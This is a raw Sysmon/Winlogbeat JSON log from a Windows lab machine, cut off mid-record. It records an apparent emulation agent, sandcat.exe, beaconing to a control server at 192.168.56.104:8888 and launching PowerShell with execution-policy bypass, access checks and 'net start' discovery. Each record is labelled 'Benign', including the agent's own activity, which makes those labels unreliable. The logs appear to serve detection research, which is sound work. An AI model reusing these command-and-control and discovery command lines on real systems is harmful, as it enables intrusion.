{"@timestamp":"2022-03-23T11:09:07.382Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: -\nUtcTime: 2022-03-23 11:09:07.382\nProcessGuid: {04787c88-ffd1-623a-a901-000000000c00}\nProcessId: 4484\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive\nCreationUtcTime: 2020-09-26 20:35:42.672\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":4484,"thread":null,"entity_id":"{04787c88-ffd1-623a-a901-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":8937,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:09.141Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:46.555Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:09:46.555\nProcessGuid: {04787c88-fffa-623a-ac01-000000000c00}\nProcessId: 6400\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"if (! $(test-path -path \\\"C:\\Program Files\\SysinternalsSuite\\\")) {  write-host \\\"[!] The path C:\\Program Files\\SysinternalsSuite does not exist. Execution has stopped.\\\";  exit 1;}Set-Location -path \\\"C:\\Program Files\\SysinternalsSuite\\\";./accesschk.exe -accepteula .;\"\nCurrentDirectory: C:\\Users\\vagrant\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481\nParentProcessGuid: {04787c88-f96f-623a-ea00-000000000c00}\nParentProcessId: 5344\nParentImage: C:\\Users\\Public\\sandcat.go-windows.exe\nParentCommandLine: \"C:\\Users\\Public\\sandcat.go-windows.exe\" -server http://192.168.56.104:8888 -group red -listenP2P -v \nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6400,"thread":null,"entity_id":"{04787c88-fffa-623a-ac01-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8938,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:47.779Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:46.555Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process accessed:\nRuleName: technique_id=T1036,technique_name=Masquerading\nUtcTime: 2022-03-23 11:09:46.555\nSourceProcessGUID: {04787c88-f96f-623a-ea00-000000000c00}\nSourceProcessId: 5344\nSourceThreadId: 1872\nSourceImage: C:\\Users\\Public\\sandcat.go-windows.exe\nTargetProcessGUID: {04787c88-fffa-623a-ac01-000000000c00}\nTargetProcessId: 6400\nTargetImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d934|C:\\Windows\\System32\\KERNELBASE.dll+5f32a|C:\\Windows\\System32\\KERNELBASE.dll+5bcc6|C:\\Windows\\System32\\KERNEL32.DLL+1be93|C:\\Users\\Public\\sandcat.go-windows.exe+644be\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5344,"thread":{"id":1872},"entity_id":"{04787c88-f96f-623a-ea00-000000000c00}","executable":"C:\\Users\\Public\\sandcat.go-windows.exe","name":"sandcat.go-windows.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"10","api":"wineventlog","record_id":8939,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:47.779Z","code":"10"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:46.586Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Image loaded:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:09:46.586\nProcessGuid: {04787c88-fffa-623a-ac01-000000000c00}\nProcessId: 6400\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nImageLoaded: C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6b621f0fd6cc913157b16d8a0cfdc3ec\\System.Management.Automation.ni.dll\nFileVersion: 10.0.18362.145\nDescription: System.Management.Automation\nProduct: Microsoft (R) Windows (R) Operating System\nCompany: Microsoft Corporation\nOriginalFileName: System.Management.Automation.dll\nHashes: SHA1=A03FCAE0C1F4BC4A81F0819DBB94289C373B1052,MD5=B18E1C187DAEB6C9B195BDD2EFDC20C7,SHA256=D36AD842C5E44483BDBBDF13D045AD5A64A9DDD5C1BAB89E81B12299D89DFC27,IMPHASH=00000000000000000000000000000000\nSigned: false\nSignature: -\nSignatureStatus: Unavailable\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6400,"thread":null,"entity_id":"{04787c88-fffa-623a-ac01-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"7","api":"wineventlog","record_id":8940,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:47.779Z","code":"7"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:46.602Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 11:09:46.602\nProcessGuid: {04787c88-fffa-623a-ac01-000000000c00}\nProcessId: 6400\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKU\\S-1-5-21-1265589927-3242731326-451682020-1000\\Software\\Microsoft\\SystemCertificates\\Root\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6400,"thread":null,"entity_id":"{04787c88-fffa-623a-ac01-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8941,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:47.779Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:46.602Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 11:09:46.602\nProcessGuid: {04787c88-fffa-623a-ac01-000000000c00}\nProcessId: 6400\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6400,"thread":null,"entity_id":"{04787c88-fffa-623a-ac01-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8942,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:47.779Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:46.602Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 11:09:46.602\nProcessGuid: {04787c88-fffa-623a-ac01-000000000c00}\nProcessId: 6400\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6400,"thread":null,"entity_id":"{04787c88-fffa-623a-ac01-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8943,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:47.779Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:46.618Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:09:46.618\nProcessGuid: {04787c88-fffa-623a-ac01-000000000c00}\nProcessId: 6400\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Temp\\__PSScriptPolicyTest_labp5wlx.llu.ps1\nCreationUtcTime: 2022-03-23 11:09:46.618\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6400,"thread":null,"entity_id":"{04787c88-fffa-623a-ac01-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":8944,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:47.779Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:46.633Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File Delete archived:\nRuleName: -\nUtcTime: 2022-03-23 11:09:46.633\nProcessGuid: {04787c88-fffa-623a-ac01-000000000c00}\nProcessId: 6400\nUser: WIN10\\vagrant\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Temp\\__PSScriptPolicyTest_labp5wlx.llu.ps1\nHashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000\nIsExecutable: false\nArchived: true","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6400,"thread":null,"entity_id":"{04787c88-fffa-623a-ac01-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"23","api":"wineventlog","record_id":8945,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":null},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:47.779Z","code":"23"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:46.817Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:09:46.817\nProcessGuid: {04787c88-fffa-623a-ad01-000000000c00}\nProcessId: 2604\nImage: C:\\Program Files\\SysInternalsSuite\\accesschk.exe\nFileVersion: -\nDescription: -\nProduct: -\nCompany: -\nOriginalFileName: -\nCommandLine: \"C:\\Program Files\\SysinternalsSuite\\accesschk.exe\" -accepteula .\nCurrentDirectory: C:\\Program Files\\SysinternalsSuite\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=691E81A8FA152F68FB8ACEFE8F59EA41DC995880,MD5=44F96457ADEB95AFD3F5457082D44538,SHA256=3247D21BC9BBBD8DF670A82E24BE754A2D58D2511EE64AFF0A1E3756CD288236,IMPHASH=8A672B6C29F8A80FC01C6E44A3CDEE82\nParentProcessGuid: {04787c88-fffa-623a-ac01-000000000c00}\nParentProcessId: 6400\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"if (! $(test-path -path \\\"C:\\Program Files\\SysinternalsSuite\\\")) {  write-host \\\"[!] The path C:\\Program Files\\SysinternalsSuite does not exist. Execution has stopped.\\\";  exit 1;}Set-Location -path \\\"C:\\Program Files\\SysinternalsSuite\\\";./accesschk.exe -accepteula .;\"\nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2604,"thread":null,"entity_id":"{04787c88-fffa-623a-ad01-000000000c00}","executable":"C:\\Program Files\\SysInternalsSuite\\accesschk.exe","name":"accesschk.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8946,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:47.780Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:48.109Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: -\nUtcTime: 2022-03-23 11:09:48.109\nProcessGuid: {04787c88-fffa-623a-ac01-000000000c00}\nProcessId: 6400\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive\nCreationUtcTime: 2020-09-26 20:35:42.672\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6400,"thread":null,"entity_id":"{04787c88-fffa-623a-ac01-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":8947,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:49.797Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:48.380Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\nUtcTime: 2022-03-23 11:09:48.380\nProcessGuid: {04787c88-fffc-623a-ae01-000000000c00}\nProcessId: 3952\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: cmd.exe /C net start\nCurrentDirectory: C:\\Windows\\system32\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=A1DBD4949DF9E892E52201B06A2D24AA5082B3D5,MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {04787c88-fdd6-623a-7601-000000000c00}\nParentProcessId: 4192\nParentImage: C:\\Users\\Public\\sandcat.exe\nParentCommandLine: \"C:\\Users\\Public\\sandcat.exe\" -server http://192.168.56.104:8888 -group diy_eval\nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":3952,"thread":null,"entity_id":"{04787c88-fffc-623a-ae01-000000000c00}","executable":"C:\\Windows\\System32\\cmd.exe","name":"cmd.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8948,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:49.797Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:48.380Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process accessed:\nRuleName: technique_id=T1036,technique_name=Masquerading\nUtcTime: 2022-03-23 11:09:48.380\nSourceProcessGUID: {04787c88-fdd6-623a-7601-000000000c00}\nSourceProcessId: 4192\nSourceThreadId: 5124\nSourceImage: C:\\Users\\Public\\sandcat.exe\nTargetProcessGUID: {04787c88-fffc-623a-ae01-000000000c00}\nTargetProcessId: 3952\nTargetImage: C:\\Windows\\system32\\cmd.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d934|C:\\Windows\\System32\\KERNELBASE.dll+5f32a|C:\\Windows\\System32\\KERNELBASE.dll+5bcc6|C:\\Windows\\System32\\KERNEL32.DLL+1be93|C:\\Users\\Public\\sandcat.exe+641de\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":4192,"thread":{"id":5124},"entity_id":"{04787c88-fdd6-623a-7601-000000000c00}","executable":"C:\\Users\\Public\\sandcat.exe","name":"sandcat.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"10","api":"wineventlog","record_id":8949,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:49.798Z","code":"10"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:48.391Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\nUtcTime: 2022-03-23 